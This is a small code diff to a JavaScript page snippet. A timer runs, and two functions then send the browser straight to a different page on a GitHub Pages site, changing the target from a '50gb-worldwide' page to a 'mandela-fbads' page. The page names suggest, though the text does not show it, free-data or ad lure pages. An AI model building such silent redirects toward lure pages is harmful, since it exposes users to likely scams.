@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://ekpaebot.github.io/fresh/50gb-worldwide.html";
+        location.href="https://ekpaebot.github.io/fresh/mandela-fbads.html";
     }
     function goon(){
-        location.href="https://ekpaebot.github.io/fresh/50gb-worldwide.html";
+        location.href="https://ekpaebot.github.io/fresh/mandela-fbads.html";
     }
